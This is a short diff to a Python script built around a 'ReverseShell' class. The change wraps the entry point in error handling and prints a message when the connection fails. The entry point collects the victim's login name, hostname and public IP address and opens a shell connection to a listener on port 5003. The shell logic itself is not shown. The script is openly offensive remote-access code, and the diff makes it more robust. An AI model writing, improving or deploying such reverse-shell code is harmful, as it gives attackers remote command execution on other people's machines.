@@ -1,12 +1,14 @@
 #!/usr/bin/env python3
 
 try:
-    import time
     from subprocess import call
+    from sys import exit
     from os import dup2
-    import socket
-    import os
     import requests
+    import socket
+    import time
+    import os
+    
 except ImportError:
     raise RuntimeError("Important modules are missing!")
 
@@ -84,12 +86,18 @@ class ReverseShell:
 if __name__ == "__main__":
     call(["clear"])
 
-    remote_connection = ReverseShell(
-        os.getlogin(),
-        socket.gethostname(),
-        "127.0.0.1",
-        requests.get('https://api.ipify.org').text,
-        5003
-    )
+    try:
+        remote_connection = ReverseShell(
+            os.getlogin(),
+            socket.gethostname(),
+            "127.0.0.1",
+            requests.get('https://api.ipify.org').text,
+            5003
+        )
 
-    remote_connection.shell()
+        remote_connection.shell()
+
+    except ConnectionRefusedError:
+        print("\033[0;37m[\033[0;33m-\033[0;37m] Connection failed: server may be offline?")
+
+        exit(1)
